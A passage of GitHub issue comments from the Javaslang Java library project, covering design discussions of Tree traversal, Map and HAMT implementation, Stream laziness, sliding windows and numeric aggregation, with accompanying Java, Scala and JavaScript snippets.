~~flatten()~~ (return type Seq)\n- flatten(Function) (return type Seq)\n- grouped(int)\n- (TODO(#110): groupBy)\n- intersperse(Object)\n- partition(Predicate)\n- permutations()\n- reverse()\n- sliding(int)\n- sliding(int, int)\n- sort()\n- sort(Comparator)\n- span(Predicate)\n- splitAt(int)\n- ~~treeMap(Function)~~\nTransformation of Values (return type Tree)\n- map(Function)\n- replace(Object, Object)\n- replaceAll(Object, Object)\n- replaceAll(UnaryOperator)\n- unzip(Function)\n- zip(Iterable)\n- zipAll(Iterable, Object, Object)\n- zipWithIndex()\nTraversion (return type Iterator)\n- iterator(int)\n. With #473 most of the work is done now.\n. Implement traversal strategy (Order) via https://dzone.com/articles/strategy-pattern-implemented-as-an-enum-using-lamb\n. We also need to resolve the Value.toTree conversion TODO then.\n. Tree should have insert(Tree) and insert(int, Tree) (see #570)\n. To get the Traversable methods work we need an initial order for a Tree. We will take an approach that is analogue to using a Comparator for a SortedMap or SortedSet. Here are the main points:\n- The Empty tree node will have an order.\n- Trees are build upon the Empty tree node.\n- In general the order of an existing tree is never changed.\n- Maybe we will provide an API to transform the order of a Tree.\nAdditionally there will be a method traverse(Order) which returns either an Iterator or a Seq of the tree nodes in the given order (return type currently open).\n. > Implement traversal strategy (Order) via https://dzone.com/articles/strategy-pattern-implemented-as-an-enum-using-lamb\nFor reasons of a small serialization footprint we will go with an enum Order\n. The Node order has to be specified explicitly because the child nodes could have different Order:\njava\nNode(Order order, T value, List<Node<T>> children);\nThis implies that the Empty node does not need an order (contrary what was said here).\n. There are too many questions regarding the order. For now we leave the Empty and Node constructor argument order away. The Tree still remains ordered. By default Tree.Order.PRE_ORDER (= depth-first order) is used. This is what traverse() returns. If another order is needed, traverse(Order) may be used, which returns a Seq (currently a Stream).\n. Type bounds of Comparator not correct.\n. Currently I see no use case for that\n. Random thoughts:\n- Beware of releasing the local version of the Javaslang repo to maven central. Uncommitted changes will be also published. Instead check out a fresh copy from github and deploy it to maven central.\n. Thanks, that helps! I'm not up-to-date regarding releasing with git - at work we still use svn o_O :-)\n. After this release move to pull requests instead of direct commits to\n- enable code reviews\n- maintain 100% code coverage & javadoc\n- get a change log between releases\n- move to a feature driven development instead of committing unrelated technical changes\n. Create a simple illustration of the collection API on javaslang.com. Example: https://twitter.com/hyPiRion/status/583680829945163776/photo/1\n. In the ideal case write unit tests that check, if all functions are overridden correctly within a type hierarchy, by using reflection.\nUpdate: It would be nice to have Traversable.flatten() here (depends on #112)\n. ## Design decision\nThere are two possibilities of overriding super interface methods in order to override the return type with a more specific (given the case that this is possible).\n1. Call super default impl by specifying a super interface (SuperInterface.super.method(...)), cast the return type to the more specific and use SuppressWarnings(\"unchecked\") to calm down the compiler.\n2. Don't provide a default implementation and implement it separately in every class. This leads to some code duplication but is more efficient at runtime. Also there are no unchecked warnings to suppress. This approach seems to be more clean in my opinion.\nIn Javaslang, the 2nd alternative is the way to go...\n. Example of doing the type system right (in my opinion):\n- Option.of(value).map(mapper) may be Some or None, depending on value\n- None.instance().map(mapper) should be None and not Option\n- new Some(value).map(mapper) should be Some and not Option (note: like in Scala, new Some(null) is Some(null) and not None).\nThese points above have a direct implementation on interface design and whether to use default methods in a specific situation. I.e. in the case of Option.map a default method like\njava\ndefault <U> Option<U> map(Function1<? super T, ? extends U> mapper) {\n    if (isEmpty()) {\n        return None.instance();\n    } else {\n        return new Some<>(mapper.apply(get()));\n    }\n}\nmakes no sense, as described above.\nUpdate: Option.flatMap for example is another story because the result of the mapper may be Some or None:\njava\n@SuppressWarnings(\"unchecked\")\n@Override\ndefault <U, OPTION extends HigherKinded1<U, Option<?>>> Option<U> flatMap(Function1<? super T, OPTION> mapper) {\n        if (isEmpty()) {\n            return None.instance();\n        } else {\n            return (Option<U>) mapper.apply(get());\n        }\n}\n. This should be done only in the lazy case (read: Stream), where it is already implemented.\n. The unrecognized @SuppressWarnings({\"unchecked\", \"varargs\"}) bug should be fixed by not attaching it to the call-site. Attaching @SuppressWarnings(\"varargs\") to the method decl may fix the eclipse compiler problem. (jdk / IDEA currently do not complain)\n. Depends on eclipse bug 430404, which is a follow-up of eclipse bug 442245.\n. Eclipse Neon M2 complains:\njava\ninterface List<T> ... {\n    default List<T> retainAll(java.lang.Iterable<? extends T> elements) {\n        // Type mismatch: cannot convert from List<capture#76-of ? extends T> to List<T>\n        final List<T> kept = List.ofAll(elements).distinct();\n        ...\n    }\n}\nFix: Double cast, first to Object, then to List.\nCaveat: Eclipse IDE automatically removes the (Object) cast on save o_O Thx Eclipse!\njava\ninterface List<T> ... {\n    @SuppressWarnings(\"unchecked\")\n    default List<T> retainAll(java.lang.Iterable<? extends T> elements) {\n        final List<T> kept = (List<T>) (Object) List.ofAll(elements).distinct();\n        ...\n    }\n}\nThis is the only solution to make Eclipse and javac happy.\n. To get Eclipse ready for developing Javaslang, we have to do the following:\n1) Disable warnings for unrecognized @SuppressWarnings, because Eclipse does not know \"varargs\"\n\n2) Disable 'remove unnecessary casts' option because it is the only workaround for the problem described above\n\n3) TODO: We need new Eclipse Formatter rules which behave like IntelliJ IDEA Javaslang formatter\n. Moreover using instanceof in equals methods breaks symmetrie. Consider to use getClass() instead.\n. Clearly all Scala case classes are (implicitely) final because of the symmetry of the (auto-generated) equals method...\n. Should toString evaluate lazy values (applies for Stream and Lazy). Scala does not... What does Haskell's Show?\n. Scala's Stream behaves as follows:\n- Stream.from(1).toString prints Stream(1, ?)\n- Stream.from(1) == Stream.from(1) runs infinitely long\nPrinting only evaluated parts of infinitely long data maybe will be needed for the REPL of Java 9...\nWe will proceed as follows: All lazy data structures will print only evaluated parts and otherwise will evaluate all element, e.g. for equals, hashCode etc.\nThe types are:\n- Stream\n- Lazy\nUpdate: Should Stream.toString() evaluate the head element?\nnew Cons(Lazy.of(1), Lazy.of(Nil.instance())).toString() could evaluate as follows:\n1. Stream(?, ?), Stream(1, ?) - depending on the internal state of the lazy head\n2. Stream(Lazy(?), Lazy(?)), Stream(Lazy(1), Lazy(Stream())) - depending on Lazy.toString\nThe first shot of Stream.toString()will take the first approach. To make this more practicable I will provide a new Lazy.of(T value) method that immediately evaluates the Lazy. Given this, Steam.of(1, 2, 3).toString()) should show up as Stream(1, 2, 3). The toString() method has additionally to check, if the lazy tail is already evaluated and Nil, i.e. the following is possible:\njava\nstream.toString(); // = \"Stream(1, 2, ?)\"\nstream.tail();     // evaluates the lazy tail, which here is Nil\nstream.toString(); // = \"Stream(1, 2)\"\n. The single test for all problems is growing. I will split the Euler solutions into separate classes.\n. See also github.com/shadaj/euler and youtube.com/shadajProgramming.\n. This will be part of every release as ongoing issue (until finished).\n. This is ongoing and done via PRs. We don't need this issue any more.\n. We do not need this ticket. Our asciidoc documentation gets better. We add javadoc were needed.\n. yes, had that idea also for Traversable - will check how it integrates\n. Yes, I think it's time :-)\nThank you, Lukas.\nThis will take a few days (beside my daylight job)\n. The Lukas-Eder-Bot ;-)\n. :+1: I will file an issue on the jOOQ page :-)\nWhat is the format of the blog post, e.g. for code snippets?\n. Great!\n. My first impression is that, compared to java.util.stream.Stream, we have (in general) no operation pipeline the elements went through. An instance (e.g. Try, List, Option, ...) of component type T would have to take care of an encapsulated optional Peek instance, which represents a Consumer of an element. Methods, which perform an operation on one or more elements would have to check, if they have to peek the element before performing the operation (like map, filter, ...).\nThat seems to be too much overhead and not natural. A possible candidate is the lazy linked list javaslang.collection.Stream.\nUpdate: The above is of course complete bullshit. A peek operation would immediately perform an action (either eagerly or lazily), it is not necessary to keep any state in a peekable object (other than protocolling a deferred peek operation in the lazy case). The way to implement a peek is described in a comment below...\n. Thank you, great example.\nGiven an object of type A<T> we would define peek : (T -> void) -> A<T>, i.e.\njava\ninterface Peekable<T> {\n    Peekable<T> peek(Consumer<T> action);\n}\nTry is a special case. Here we would expect  a CheckedConsumer instead.\n(Note: This could be accomplished by a CheckedPeekable instance. Same applies for map, flatMap of Functors and Monads. We need checked versions. Update: depends on #137)\nThe semantics of peek depends on the data type. However, in each case it will return the instance it was called on. Additionally the value passed to the consumer is determined as follows:\n- Try: the value of Success (or nothing happens)\n- Option: the value of Some (or nothing happens)\n- Either: the value of either left or right in the context of a left or right projection (or nothing happens in the context of the opposite projection)\n- List:  peeks the head element of the list, if present (see also java.util.LinkedList#peek())\n- Stream: peeks an element of the underlying stream, when it is consumed\nSounds like a plan!\n. :-))\n. Note: peek is essentially the same as forEach, modulo return type and type of evaluation (lazy vs eager)\n. Instead of creating interfaces Peekable and CheckedPeekable, peek() will walk into Monad* and CheckedMonad*. This concept of high cohesion can be found throughout the design of Javaslang.\nI.e. the checked functions CheckedPredicate, CheckedRunnable and CheckedSupplier are part of Try (since 1.2.0) because they logically belong to an error handling context - outside of this they make pretty much no sense.\nSimilar to this and additionally to flatMapand map, the functions filter, forEachand peek are belonging to a monadic data type. Why? First, peek is very similar to forEach, see above. Second, of cause it is a matter of fact that Monads can be seen as cats in boxes. We may want to unbox these cats (forEach, peek) or just select only some boxes, depending on the cat inside (filter). (Note: this is just a metaphor. Monads are known to be more that just container types in general.)\nThis whole idea is a copycat of Scala's monad used in for-comprehensions, which abstracts over cascading for-values (flatMap), which may have if-guards (filter) and finally yielding a value (map). Adapting this may come handy in #105.\nUpdate: Please note that it is currently not cleanly possible to make Either implement Monad1 because of the projections.\n. Depends on #139\n. Extending the Monad interfaces makes clear, that Tuple does not need to implement Monad.\nFurthermore Tuples are the only types which implement Monad2...Monad26.\nTherefore Tuple will remove the Monad interface and Monad2-26, Functor2-26 and HigherKinded2-26 will be deleted. (Removing things without touching the business logic is always a good idea)\n. I'm on it!\n. The file generator/Generator.scala and the whole dir src-gen have to be excluded, currently manually or by reverting formatting changes.\nI have to update some javadoc comments because the IntelliJ formatter is producing javadoc incompatible to doclint of java 8 which breaks the (travis-ci) build (when releasing).\n@ggalmazor Any suggestions on which settings to export. I don't want to export all (my own color scheme etc.). I think File templates are a good idea to get the Javaslang file header. Do you have an idea which export option is responsible for the Editor > Code Style > Java settings?\n. Thx! - ohh, I overlooked the first option Code Style.\nThis is the current list of settings:\n- Code Style\n- File templates\n- Inspection profiles\nWill push the changes in a sec...\n. Waiting for travis-ci build #666 of the pull request. o_O\n. Maybe a curried factory method is be sufficient?\njava\nstatic Function_n<T1, T2, ..., Tn, Void> of(Function1<T1, Function1<T2, ..., Consumer<Tn>...> curried) {\n    return (t1, ..., tn) -> {\n        curried.apply(t1).apply(t2) ... .accept(tn);\n        return null;\n    };\n}\nwhich can be used as follows:\n``` java\nvoid forEach(Function consumer);\nmonad3.forEach(Function.of(t1 -> t2 -> t3 -> System.out.println(t1 + t2 + t3)))\n```\nAnswer: No. Too much noise. Need to generate Consumers which extend Functions with return type Void.\n. Factory sounds like baking something hand-crafted together.\nLifting sounds like an elegant solution by taking advantage of some inherent structural properties.\nThe result of both is the same: given some input return some output. If we provide lift and of methods side-by-side, this would make the API more complicated - the developer would have to choose between different methods.\nI think it would be best to stick with of methods and in the case of Function call it lift to make clear that something happens to the argument (which has the same type as the result).\n. This issue is not finished, yet.\nFor a better understanding of 'lifting' see the discussion What is a \"lifted representation\".\nFor example I want to\n- construct a Stream of elements, e.g. Stream.of(1, 2, 3, ...). \n- lift an Iterable to the next higher level by providing Stream.lift(iterable). Most Monads are Iterables, like Try (checked), Option, Either (projections) and Traversable.\n. Side-by-side use of lift and of factory methods in Stream and List introduce ambiguities.\n. Either, Option, Try: yes - the rest: no\n. This add too much complexity to the API. For now we will use javaslang.collection.Iterator or javaslang.collection.Stream if we need a lazy collection.\n. Maps work best backed by a Trie, see \"Purely Functional Data Structures\", p. 163 ff.\n. Good read on functional/immutable Map: http://blog.ezyang.com/2010/03/the-case-of-the-hash-array-mapped-trie/\n. Ideal Hash Trees (Phil Bagwell/Clojure): http://lampwww.epfl.ch/papers/idealhashtrees.pdf\n(See also wikipedia Trie and Hash array mapped trie)\n. Fast mergable integer maps: http://citeseer.ist.psu.edu/viewdoc/download?doi=10.1.1.37.5452&rep=rep1&type=pdf\n. @ignasi35 Here I provided some links for the Map implementation. I think, Map is one of the most complex collections to implement.\nWithout having read on Maps yet, a naive impl would be to use a balanced binary search tree with (informally) Entry(key.hashCode, List(values)), where equals and compareTo of an Entry just compare the key.hashCode and not the values. Given that, a tree node could be found just by the hashCode and the value could be obtained from the associated List. We need a List of values at each node because of hash collisions.\nBut my understanding is that HashMap.get() performs in O(1). The above impl would implement in O(log n)...\nBetter implementations use the so called Trie data structure with 'marked' edges (and values at the leafs only?). This has to be further investigated... How does Java implement (mutable) HashMap? How does Scala implement HashMap?\n. @ruslansennov Wow, Ruslan, I'm really impressed. This is exactly what we need. This is the best implementation I can imagine - head to head with Clojure and Scala.\nI will add some line notes in a few minutes.\nHere is an overview of the design of the upcoming collections:\n\nWe need to create a Map interface. The additional operations compared to Traversable to start with are:\n``` java\ninterface Map extends Traverable>\nboolean containsKey(K key);\n\nboolean containsValue(V value);\n\n// we will add this when we have Set\n// Set<Entry<K, V>> entrySet();\n\nV get(T key);\n\nV getOrDefault(Object key, V defaultValue);\n\n// we will add this when we have Set\n// Set<K> keySet();\n\nMap<K, V> put(K key, V value);\n\nMap<K, V> remove(K key);\n\nTraversable<V> values();\n\nfinal class Entry<K, V> implements Serializable {\n\n    private static final long serialVersionUID = 1L;\n\n    public final K key;\n    public final V value;\n\n    public Entry(K key, V value) {\n        this.key = key;\n        this.value = value;\n    }\n\n    @Override\n    public boolean equals() {\n        if (o == this) {\n            return true;\n        } else if (o instanceof Entry) {\n            final Entry<?, ?> that = (Entry<?, ?>) o;\n            return Objects.equals(this.key, that.key)\n                    && Objects.equals(this.value, that.value);\n        }\n    }\n\n    @Override\n    public int hashCode() {\n        return Objects.hash(key) * 31 + Objects.hash(value);\n    }\n\n    @Override\n    public String toString() {\n        return \"(\" + key + \", \"+ value + \");\n    }\n}\n\n}\n```\nIn the image attached above, I put separate Trie. Does this make sense? Can there be a general purpose Trie? In my understanding, the HAMT Trie implementation is very specific to the HashMap application.\nMy plan was to not bother the user with implementation details. That means, I would just provide a Map and a HashMap. The HashMap internally is a HAMT but the user does not see this. It is just works as sophisticated as possible (like HAMT backed HashMap).\nImplementing all the Traversable is lot of work. We may in a first step provide a Map interface, which does not extends Traversable, so we can pull a version into the master branch.\n. @ruslansennov  Yes you are right. Traversable works good for (linear) data structures like sequences and sets. For more complex (nested) structures, like Trees and Maps, it is confusing, overloaded and seems to be a little bit faked.\nConversion between Traversable and Map can be done by calling Map.entrySet() and HashMap.ofAll(Iterable<? extends Entry>). Also we will create <K,V> TranversableOnce.toHashMap(Function<? super T, ? extends Entry<? extends K, ? extends V>).\nMap should implement TraversableOnce and the upcoming FilterMonadic (map, flatMap, filter, flatten). Additionally we should implement the features of Java's Map.\nI like to use size() here instead of Traversable's length() (for Tree and Map).\nBtw: Thanks for pushing this in the right direction. Implementing Traversable for Tree and Map would be overkill!\n. @ruslansennov If it is ok for you, I will assign you to this task.\nUpdate: oh, does not seem to work. maybe github needs to be configured...\n. @ruslansennov Scala's Map does implement Traversable<Entry>, i.e. take, drop, reduce, sum, ...\nI target this also for Javaslang. Maby we can implement working placeholders for most operations:\njava\nHashMap<...> someOperation() {\n    return toList().someOperation().toHashMap(Function.identity());\n}\n. Our implementation of the HAMT (which @ruslansennov contributed) is based on:\n- https://github.com/mattbierner/hamt/blob/master/lib/hamt.kep\n- https://github.com/exclipy/pdata/blob/master/Data/HamtMap.hs\n. ## State of the Traversables\nI'm currently getting the Map vs Set vs Seq interfaces right. With my refactoring it was clear that some methods have to move from the Traversable interface to Seq because the signatures in Map differ.\nExample:\n``` java\n// Seq\n Seq> zip(Iterable that);\n Seq> zipAll(Iterable that, T thisElem, U thatElem);\nSeq> zipWithIndex();\n// Map\n Map, U> zip(Iterable that);\n Map, U> zipAll(Iterable that, Entry thisElem, U thatElem);\nMap, Integer> zipWithIndex();\n```\nAlso we can only reverse() something, which has an order. Reversing a Set makes no sense.\nCurrently I revise the Traversable interface to get Seq, Set and Map method signatures right.\nMy strategy is, to follow the types. If in doubt, I have a look at Haskell, Scala et al.\n. Also we have the opportunity to get rid of null.\nExample: Map.get(key) should return Option<V> instead of V. getOption(key) will be removed accordingly. This is also how Scala operates.\nUpdate: Also we remove Map.getOrDefault(key). This is redundant now. We use Map.get(key).orElse(default) instead.\n. Seq.get(int) may by ambiguous with Map.get(key), if key is of type Integer. Therefore we remove Seq.get(int). Because Seq<T> is an IntFunction<T> we use apply(int) instead.\nUpdate: That's totally wrong. Seq and Map are two different Traversables. Seq.get(int) will stay with us.\n. will do now :-)\n. Fixed with #609\n. Cannot remove factory methods, we need them all.\nThe implementation of particular factory methods was fixed by pull request #176\n. Simple Test:\njava\nSystem.out.println(Stream.from(1).drop(10_000_000).filter(i -> i % 2 == 0));\ntakes 0.7 sec on my early 2011 notebook and prints:\njava\nStream(10000002, ?)\nas expected.\n. - Traversable has no recursive methods\n- Seq has no recursive methods\nFixed:\n- Stream.drop(n)\n- Stream.dropWhile(Predicate)\n- Stream.filter(Predicate)\nTODO:\n- Stream.flatMap is recursive\n- Stream.flatten is recursive\nCurrently no impact:\n- List.combinations(int) and List.permutations() are recursive\n- Stream.combinations(int) and Stream.permutations() are recursive\n. I like it to look at Scala. It is one of my favorite languages. Because I'm lazy, I want Java and Scala to behave similar. This makes switching between languages a little bit more painless.\nscala\nscala> Stream.from(Int.MaxValue-1).take(3).mkString(\", \")\nres0: String = 2147483646, 2147483647, -2147483648\nThe above gave us the answer to this issue.\n. Thank you for the example! I've transform(mapper) in mind (like tree transformation). Nodes of the tree are monads, each monad has transform. Will go into it later today...\n. Locally I have a running version. Basically it is a recursive map with Match cases.\nMonad gets a new method treeMap which traverses a tree of Monads and transforms values.\njava\ninterface Monad<T> {\n    default <U, Z> Monad<Z> treeMap(Function<U, Object> mapper) {\n        return (Monad<Z>) map(Match.ofType(Object.class)\n                .caze((Monad m) -> m.treeMap(mapper))\n                .caze((U u) -> f.apply(u))\n        );\n    }\n}\nUnsafety 1\nIf the type of the domain of the mapper function does not match the 'real' type, then a ClassCastException will occur at runtime.\nUnsafety 2\ntreeMap does cast the result via generic method parameter\nThoughts\nBeing unsafe is a fair balance between type safety and viability. Update Currently the only unsafe methods are Monad.flatten() and Monad.treeMap(Function). The methods Traversable.{min,max,sum,product,...} are safe in the return type but may throw under certain circumstances, as defined in the interface.\n``` java\n// Adaption of your example\npublic class Issue185Test {\nstatic Option<String> extract(String str) {\n    if (str.length() >= 15) {\n        return Option.of(str.substring(10, 15));\n    } else {\n        return Option.none();\n    }\n}\n\n@Test\npublic void shouldTreeMapStream() {\n\n   final Stream<Option<Long>> sums = Stream.of(\"cocotero\", \"chuchu blabla pinpon\")\n            .map(Issue185Test::extract)\n            .treeMap(String::chars)\n            .treeMap(IntStream::sum);\n\n    // sums = Stream(None, Some(447))\n}\n\n}\n```\nI really love this issue. Especially it shows me where I need to tweak the Javaslang API a little bit, i.e. it shows that in addition to Match a CheckedMatch is needed because we also have a CheckedMonad which is implemented by Try. There we deal with checked functions.\nAfter adding the missing parts and polishing the code, this will go into release 1.2.1.\n. Thx :)\n. Here is a comparision of akka-streams and scalaz-streams: https://softwaremill.com/comparing-akka-stream-scalaz-stream/#toc-streaming-transforming-a-file\nHere is an application of rxjava-jdbc covering compositional jdbc processing: https://github.com/davidmoten/rxjava-jdbc\n. Also this: http://projectreactor.io/docs/reference/#reactor-stream\n. Also have a look at jdk9 Candidate classes Flow and    SubmissionPublisher\nSee java.util.concurrent.Flow\n. Relation between Java 8 Stream and RxJava Reactive Streams: http://www.infoq.com/news/2015/10/javaone-2015-preview\n(Search for \"Java 8 Stream API and RxJava Comparison: Patterns and Performance\")\n. This looks like a very nice tutorial: Functional Reactive Programming in Java\n. Nice, thank you John! Hopefully I will find some time soon to play around with it.\n. @johnmcclean-aol I admire you for handling the complexity of all of the cyclops modules and the dependencies between them! That is not trivial. E.g. when versions or even API changes.\n. I see different Java 8 libraries emerge which support bindings/abstractions for other libraries. Cyclops is one of them, derive4j is another.\nAre there performance impacts when converting between the two worlds, e.g. by converting elements one-by-one, or do you follow the delegation principle?\n. Sounds absolutely awesome. I'm looking forward to reactive streaming (I will focus on pull, mostly because I think that it is more easy to deal with back-pressure then).\nI'm not familiar with gradle. I've heard pros and cons (as always, there isn't 'the perfect tool'). Think I should give it a try.\n. out of scope for Javaslang\n. Additional requirement: checked vs unchecked case without adding a CheckedMatch.\n. The API will be\n- List.nil()\n- List.of(T)\n- List.of(T...)\n- List.ofAll(Iterable)\nThe ofAll() is a new name, the cons() disappeared. ofAll aligns well to addAll, removeAll etc., known from Collections. Also it is great to have the unique name ofAll() along all collections (currently only List and Stream), instead of introducing List.list(Iterable), Stream.stream(Iterable) etc.\n. For now I added:\n- headOption()\n- tailOption()\n- initOption()\n- lastOption()\n. Thx! How does Scala behave compared to this? I will check it.\n. You are right! I have the feeling, that I missed a unit test for window size > 1 and step size 1. I will investigate it later today!\n. Hi again,\nI've tested the examples of your 2nd comment with the implementation you mentioned in the 3rd comment. I get another result (see full example below).\nI've created a fix of Javaslang's sliding(), which behaves like the code you mentioned.\n``` java\npublic class Main {\npublic static void main(String[] args) {\n    {\n        final List<Integer> input = Arrays.asList(1, 2, 3, 4, 5);\n        final List<List<Integer>> result = input.stream().collect(CustomCollectors.sliding(2));\n\n        // prints [[1,2], [2,3], [3,4], [4,5]]\n        System.out.println(result);\n    }\n    {\n        final List<Integer> input = Arrays.asList(1, 2, 3, 4, 5);\n        final List<List<Integer>> result = input.stream().collect(CustomCollectors.sliding(2, 4));\n\n        // prints [[1, 2], [5]] (===> your example: [[1, 2]])\n        System.out.println(result);\n    }\n    {\n        final List<Integer> input = Arrays.asList(1, 2, 3, 4);\n        final List<List<Integer>> result = input.stream().collect(CustomCollectors.sliding(5, 3));\n\n        // prints [[1, 2, 3, 4]] (===> your example: nil())\n        System.out.println(result);\n    }\n}\n\nstatic class CustomCollectors {\n\n    public static <T> Collector<T, ?, List<List<T>>> sliding(int size) {\n        return new SlidingCollector<>(size, 1);\n    }\n\n    public static <T> Collector<T, ?, List<List<T>>> sliding(int size, int step) {\n        return new SlidingCollector<>(size, step);\n    }\n}\n\nstatic class SlidingCollector<T> implements Collector<T, List<List<T>>, List<List<T>>> {\n\n    private final int size;\n    private final int step;\n    private final int window;\n    private final Queue<T> buffer = new ArrayDeque<>();\n    private int totalIn = 0;\n\n    public SlidingCollector(int size, int step) {\n        this.size = size;\n        this.step = step;\n        this.window = Math.max(size, step);\n    }\n\n    @Override\n    public Supplier<List<List<T>>> supplier() {\n        return ArrayList::new;\n    }\n\n    @Override\n    public BiConsumer<List<List<T>>, T> accumulator() {\n        return (lists, t) -> {\n            buffer.offer(t);\n            ++totalIn;\n            if (buffer.size() == window) {\n                dumpCurrent(lists);\n                shiftBy(step);\n            }\n        };\n    }\n\n    @Override\n    public Function<List<List<T>>, List<List<T>>> finisher() {\n        return lists -> {\n            if (!buffer.isEmpty()) {\n                final int totalOut = estimateTotalOut();\n                if (totalOut > lists.size()) {\n                    dumpCurrent(lists);\n                }\n            }\n            return lists;\n        };\n    }\n\n    private int estimateTotalOut() {\n        return Math.max(0, (totalIn + step - size - 1) / step) + 1;\n    }\n\n    private void dumpCurrent(List<List<T>> lists) {\n        final List<T> batch = buffer.stream().limit(size).collect(Collectors.toList());\n        lists.add(batch);\n    }\n\n    private void shiftBy(int by) {\n        for (int i = 0; i < by; i++) {\n            buffer.remove();\n        }\n    }\n\n    @Override\n    public BinaryOperator<List<List<T>>> combiner() {\n        return (l1, l2) -> {\n            throw new UnsupportedOperationException(\"Combining not possible\");\n        };\n    }\n\n    @Override\n    public Set<Characteristics> characteristics() {\n        return EnumSet.noneOf(Characteristics.class);\n    }\n}\n\n}\n```\n- Daniel\n. Note: I split the collection in order to get the expected result. Perhaps there is a better implementation but it's concise:\nList:\njava\nList<List<T>> sliding(int size, int step) {\n    if (size <= 0 || step <= 0) {\n        throw new IllegalArgumentException(String.format(\"size: %s or step: %s not positive\", size, step));\n    }\n    List<List<T>> result = Nil.instance();\n    List<T> list = this;\n    while (!list.isEmpty()) {\n        final Tuple2<List<T>, List<T>> split = list.splitAt(size);\n        result = result.prepend(split._1);\n        list = split._2.isEmpty() ? Nil.instance() : list.drop(step);\n    }\n    return result.reverse();\n}\nStream:\njava\nStream<Stream<T>> sliding(int size, int step) {\n    if (size <= 0 || step <= 0) {\n        throw new IllegalArgumentException(String.format(\"size: %s or step: %s not positive\", size, step));\n    }\n    if (isEmpty()) {\n        return Nil.instance();\n    } else {\n        final Tuple2<Stream<T>, Stream<T>> split = splitAt(size);\n        return new Cons<>(split._1, () -> split._2.isEmpty() ? Nil.instance() : drop(step).sliding(size, step));\n    }\n}\n. @ggalmazor My pull request closed this issue - I reopened it to wait for your OK...\n. ... I will prepare the release 1.2.2 now because I'm busy tomorrow. If there is s.th. missing don't hesitate and give me a hint!\n. great!\n. Yes, I added this yesterday: #196 \nI will release it with the groupBy() and sliding() features.\n. Btw. - there's more in the pipeline. I will introduce all missing collection methods like scanLeft, scanRight, etc.\nI'm looking at more sophisticated collection libraries than Java 8 Stream. E.g. Scala is way more sophisticated...\n. Fixed by https://github.com/javaslang/javaslang/commit/e8321f5db2193e55b9e3545d64674520f6d1c81a\n. Technical realization: Perform computation with JavaScript\nJava 8 has Nashorn, why not use it? JavaScript is an untyped language, operations are always defined/do not throw and the JavaScript engine is fast. JavaScript has also 64 bit doubles, so there should be no loss regarding precision.\nExample: Traversable.sum()\njava\n// this is Java\ndefault double sum() {\n    return Try.of(() -> (double) JS.get().invokeFunction(\"sum\", this)).get();\n}\njavascript\n// this is JavaScript\nvar sum = function(iterable) {\n    var acc = 0.0\n    for each (elem in iterable) {\n        acc += parseFloat(elem)\n    }\n    return acc\n}\nThe JavaScript engine JS is set up as follows:\njava\n// the engine is set up lazily within the Traversable interface\nLazy<Invocable> JS = Lazy.of(() -> Try.of(() -> {\n    final ScriptEngine engine = new ScriptEngineManager().getEngineByName(\"nashorn\");\n    engine.eval(new InputStreamReader(Traversable.class.getResourceAsStream(\"traversable.js\")));\n    return (Invocable) engine;\n}).get());\nNote: With this approach it is even possible to sum strings. E.g. the solution described above will do the following:\njava\nList.of(\"1 kg\", \"2 kg\", \"3 kg\").sum(); // = 6\nThis solution should also be thread-safe. More on Nashorn JavaScript thread-safety here: https://blogs.oracle.com/nashorn/entry/nashorn_multi_threading_and_mt\n. A more optimized script would look like this:\n``` javascript\n/\n * Computes the average of iterable elements as double.\n /\nvar avg = function(iterable) {\n    // division by zero is NaN\n    return compute(iterable, 0.0, function(acc, value) { return acc + value }, function(acc, count) { return acc / count })\n}\n/\n * Computes the sum of iterable elements as double.\n /\nvar sum = function(iterable) {\n    return compute(iterable, 0.0, function(acc, value) { return acc + value }, function(acc, count) { return acc })\n}\n/\n * Computes the product of iterable elements as double.\n /\nvar product = function(iterable) {\n    return compute(iterable, 1.0, function(acc, value) { return acc * value }, function(acc, count) { return acc })\n}\n/\n * Represents a computation given iterable elements.\n \n * @param iterable A java.lang.Iterable of arbitrary objects.\n * @param zero The neutral element regarding the accumulate operation.\n * @param accumulate(acc, value) Accumulates the current accumulator with the given value.\n * @param result(acc, count) Computes the result given the accumulator and the element count.\n * @return a double value or NaN if an element has no numerical representation using parseFloat()\n */\nvar compute = function(iterable, zero, accumulate, result) {\n    var acc = zero\n    var count = 0\n    for each (elem in iterable) {\n        var float = parseFloat(elem)\n        if (isNaN(float)) {\n            return float\n        }\n        acc = accumulate(acc, float)\n        count += 1\n    }\n    return result(acc, count)\n}\n```\n. I'm convinced that this goes in the right direction. However, Java is a statically typed backend language without room for 'elastic' behavior. Most probably there will be 'fear' of undefined values, e.g. when summing Strings or arbitrary objects without a numeric representation.\nMaybe the correct 'Java-way' would be to throw a NumberFormatException instead of returning NaN or Some(NaN). On the other hand NaN is expressing exactly that the result of a computation is not a number. We will see. I'm waiting for some feedback.\nThrowing an Exception would be a viable option here. But hey, we are functional now! Java folks should start to think in values. Exceptions are unnecessary ballast.\nUpdate: Before this, I thought of an approach using an interface to describe how an object is transformed to a number/double. Unfortunately the Java type Number is an abstract class, not an interface. Scala can bring implicit helpers into scope which take care of such things as conversion. Java can't do that. We need interfaces for that. But we should not underestimate the power of Traversable. Instead of having an interface to transform objects to numbers we just use Traversable.map to get them in the right shape.\n. I've slept one night over this topic and I think it would be great to return an instance of Number instead of a double.\nThe caller of sum could decide, if a double or long is wanted. The underlying implementation could compute both - a long value and a double value. E.g. there would be no loss of accuracy when summing up int values.\nAlso I think, that we should throw a NumberFormatException or even an UnsupportedOperationException, if the elements of Traversable are not numeric / have no number representation.\nThe same applies for min, max, etc - if the elements are not comparable, an UnsupportedOperationException should be thrown.\nIt is unsatisfactory that the API for numerical changes will again change slightly. But the goal is to provide the best solution possible.\n. This is a follow up of #207 \n. A SortedSet<T extends Comparable<T>> consists of objects which are totally ordered. Here, we will back it by a RedBlackTree which is currently one of the most efficient binary search tree data structures.\nA general Set<T> consists of arbitrary objects which can be compared using equals(). Currently I'm investigating how to implement a Set in the most efficient way. E.g. the set could be backed by a RedBlackTree containing elements (hashCode, List) to simulate a HashMap. Maybe a Trie or a Map is more efficient, depending on how many hash collisions are expected to occur etc. This has to be further investigated...\n. Further reading on how to delete nodes of a RedBlackTree (updated):\n- The missing method: Deleting from Okasaki's red-black trees by Matt Might\n  - Original code\n  - GADT version by Stephanie Weirich\n  - Persistent Java\n    implementation\n- http://www.cs.kent.ac.uk/people/staff/smk/redblack/rb.html\nAnd also\n- ~~http://www.geeksforgeeks.org/red-black-tree-set-3-delete-2~~ (not so good)\n- 